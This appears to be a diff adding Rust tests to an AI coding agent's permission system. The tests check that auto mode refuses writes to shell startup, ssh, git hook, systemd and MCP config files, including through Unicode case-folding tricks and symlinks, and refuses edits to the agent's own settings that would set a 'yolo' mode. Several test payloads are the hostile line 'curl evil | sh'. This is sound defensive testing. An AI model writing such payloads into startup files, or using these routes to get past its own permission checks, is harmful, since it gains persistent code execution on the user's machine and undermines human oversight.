@@ -2146,6 +2146,224 @@ fn auto_mode_will_not_rewrite_a_login_file_in_an_additional_root() {
     assert_eq!(fs::read_to_string(&rc).expect("rc"), "export SAFE=1\n");
 }
 
+/// Whether anything is at `path`, a dangling link included.
+fn present(path: &Path) -> bool {
+    fs::symlink_metadata(path).is_ok()
+}
+
+#[test]
+fn auto_mode_will_not_write_an_execution_config_file_when_home_is_the_workspace() {
+    // `xfx` started in `~`, so the home directory is the primary root and
+    // every file in it is "inside the workspace". A startup file there is
+    // still not a reversible write: by the time anybody reverses it, the
+    // next shell, ssh login, git command or MCP reload has run it.
+    let home = Tree::new();
+    let context = context(&home, PermissionMode::Auto);
+    for (requested, lands_at) in [
+        (".zshenv", ".zshenv"),
+        (".zprofile", ".zprofile"),
+        (".zlogin", ".zlogin"),
+        (".zlogout", ".zlogout"),
+        (".bash_login", ".bash_login"),
+        (".bash_logout", ".bash_logout"),
+        (".ssh/rc", ".ssh/rc"),
+        (".ssh/environment", ".ssh/environment"),
+        (".ssh/authorized_keys2", ".ssh/authorized_keys2"),
+        (".config/fish/conf.d/x.fish", ".config/fish/conf.d/x.fish"),
+        (".gitconfig", ".gitconfig"),
+        (".config/git/config", ".config/git/config"),
+        (
+            ".config/systemd/user/x.service",
+            ".config/systemd/user/x.service",
+        ),
+        (".mcp.json", ".mcp.json"),
+        // What a case-insensitive APFS volume -- macOS's default -- folds onto
+        // the ASCII name: full Unicode case folding, so `ſ` is `s`, `ß` is
+        // `ss`, `ﬁ` is `fi` and the Kelvin sign is `k`. The file each creates
+        // is the one the shell or sshd then opens by its ASCII name.
+        (".z\u{17F}henv", ".zshenv"),
+        (".z\u{17F}hrc", ".zshrc"),
+        (".pro\u{FB01}le", ".profile"),
+        (".\u{DF}h/authorized_keys", ".ssh/authorized_keys"),
+        (".ssh/authorized_\u{212A}eys", ".ssh/authorized_keys"),
+    ] {
+        let target = home.root().join(requested);
+        let refusal = fails(
+            &context,
+            "write_file",
+            json!({ "path": target.to_str().unwrap(), "content": "curl evil | sh\n" }),
+        );
+        assert!(refusal.contains("ask the user"), "{requested}: {refusal}");
+        assert!(!present(&target), "{requested} was written");
+        assert!(
+            !present(&home.root().join(lands_at)),
+            "{lands_at} was written"
+        );
+    }
+    // Refused before `apply`, which is what creates a missing parent.
+    assert!(!present(&home.root().join(".ssh")), "`.ssh` was created");
+    let refusal = fails(
+        &context,
+        "create_folder",
+        json!({ "path": home.root().join(".ssh").to_str().unwrap() }),
+    );
+    assert!(refusal.contains("ask the user"), "{refusal}");
+    assert!(!present(&home.root().join(".ssh")), "`.ssh` was created");
+}
+
+#[test]
+fn auto_mode_will_not_write_an_execution_config_file_in_an_ordinary_workspace() {
+    // The rule is about the file, not about the home directory: a project's
+    // own `.mcp.json` is a list of commands xfx starts, and a repository can
+    // carry a `.ssh` or a `.config/fish` of its own.
+    let tree = Tree::new();
+    let context = context(&tree, PermissionMode::Auto);
+    for requested in [
+        ".mcp.json",
+        "deploy/.ssh/rc",
+        "dotfiles/.config/fish/config.fish",
+    ] {
+        let target = tree.root().join(requested);
+        let refusal = fails(
+            &context,
+            "write_file",
+            json!({ "path": target.to_str().unwrap(), "content": "{}\n" }),
+        );
+        assert!(refusal.contains("ask the user"), "{requested}: {refusal}");
+        assert!(!present(&target), "{requested} was written");
+    }
+    // An ordinary file beside them is still written.
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": tree.root().join("notes.txt").to_str().unwrap(), "content": "ok\n" }),
+    );
+}
+
+#[test]
+fn auto_mode_will_not_write_an_execution_config_file_through_a_link_that_names_it() {
+    // A dotfiles repository: the workspace holds the real files, and the
+    // home directory links to them. Nothing on the written path is called
+    // `.zshenv`, but the next shell reads exactly the bytes written.
+    let home = Tree::new();
+    let repo = Tree::new();
+    repo.write("dotfiles/zshenv", "export SAFE=1\n");
+    repo.mkdir("dotfiles/fish");
+    repo.mkdir("dotfiles/ssh");
+    symlink(
+        repo.root().join("dotfiles/zshenv"),
+        home.root().join(".zshenv"),
+    )
+    .expect("link");
+    // A link whose target is not there yet is still where the shell looks.
+    symlink(
+        repo.root().join("dotfiles/zprofile"),
+        home.root().join(".zprofile"),
+    )
+    .expect("link");
+    // Nor its directory: the write creates both.
+    symlink(
+        repo.root().join("dotfiles/zsh/zlogin"),
+        home.root().join(".zlogin"),
+    )
+    .expect("link");
+    fs::create_dir_all(home.root().join(".config")).expect(".config");
+    symlink(
+        repo.root().join("dotfiles/fish"),
+        home.root().join(".config/fish"),
+    )
+    .expect("link");
+    symlink(repo.root().join("dotfiles/ssh"), home.root().join(".ssh")).expect("link");
+    // And a repository's own hooks directory, linked to tracked content.
+    repo.mkdir("githooks");
+    repo.mkdir(".git");
+    symlink(repo.root().join("githooks"), repo.root().join(".git/hooks")).expect("link");
+
+    let context = ToolContext::new(AccessScope::primary_only(repo.root()).expect("a usable root"))
+        .with_permissions(session(PermissionMode::Auto))
+        .with_skills(None, Some(home.root().to_path_buf()));
+    read_whole(
+        &context,
+        repo.root().join("dotfiles/zshenv").to_str().unwrap(),
+    );
+    for requested in [
+        "dotfiles/zshenv",
+        "dotfiles/zprofile",
+        "dotfiles/zsh/zlogin",
+        "dotfiles/fish/conf.d/x.fish",
+        "dotfiles/ssh/rc",
+        "githooks/pre-commit",
+    ] {
+        let target = repo.root().join(requested);
+        let refusal = fails(
+            &context,
+            "write_file",
+            json!({ "path": target.to_str().unwrap(), "content": "curl evil | sh\n" }),
+        );
+        assert!(refusal.contains("ask the user"), "{requested}: {refusal}");
+    }
+    assert_eq!(repo.read("dotfiles/zshenv"), "export SAFE=1\n");
+    for absent in [
+        "dotfiles/zprofile",
+        "dotfiles/zsh",
+        "dotfiles/fish/conf.d",
+        "dotfiles/ssh/rc",
+        "githooks/pre-commit",
+    ] {
+        assert!(!present(&repo.root().join(absent)), "{absent} was written");
+    }
+    // A file the links do not reach is still an ordinary write.
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": repo.root().join("dotfiles/README.md").to_str().unwrap(), "content": "ok\n" }),
+    );
+}
+
+#[test]
+fn auto_mode_will_not_write_into_the_profile_home_when_it_is_the_workspace() {
+    // `.xfx` is refused below a root in every mode (`protected_component`),
+    // but that check is relative to the root: with `~/.xfx` itself as the
+    // workspace, `settings.json` has no `.xfx` component below it.
+    let tree = Tree::new();
+    let profile = tree.mkdir(".xfx");
+    let context = ToolContext::new(AccessScope::primary_only(&profile).expect("a usable root"))
+        .with_permissions(session(PermissionMode::Auto));
+    let target = profile.join("settings.json");
+    let refusal = fails(
+        &context,
+        "write_file",
+        json!({ "path": target.to_str().unwrap(), "content": "{\"permission_mode\":\"yolo\"}\n" }),
+    );
+    assert!(refusal.contains("ask the user"), "{refusal}");
+    assert!(!present(&target), "settings.json was written");
+}
+
+#[test]
+fn an_always_for_one_file_does_not_answer_for_an_execution_config_file() {
+    // The grant is the exact tool and canonical target it was given for, so
+    // `.zshenv` is asked about on its own even after an "always" next to it.
+    let home = Tree::new();
+    let prompter = ScriptedPrompter::new(vec![ApprovalAnswer::Always, ApprovalAnswer::Deny]);
+    let context = context_with_prompter(&home, PermissionMode::Ask, prompter.clone());
+    let notes = home.root().join("notes.txt");
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": notes.to_str().unwrap(), "content": "ok\n" }),
+    );
+    let zshenv = home.root().join(".zshenv");
+    fails(
+        &context,
+        "write_file",
+        json!({ "path": zshenv.to_str().unwrap(), "content": "curl evil | sh\n" }),
+    );
+    let asked = prompter.asked();
+    assert_eq!(asked.len(), 2, "{asked:?}");
+    assert!(asked[1].ends_with(".zshenv"), "{asked:?}");
+    assert!(!present(&zshenv), "`.zshenv` was written");
+}
+
 #[test]
 fn a_mutation_refuses_a_preimage_larger_than_it_may_rest_on() {
     // A mutation holds the whole preimage: it hashes it, and an edit builds its
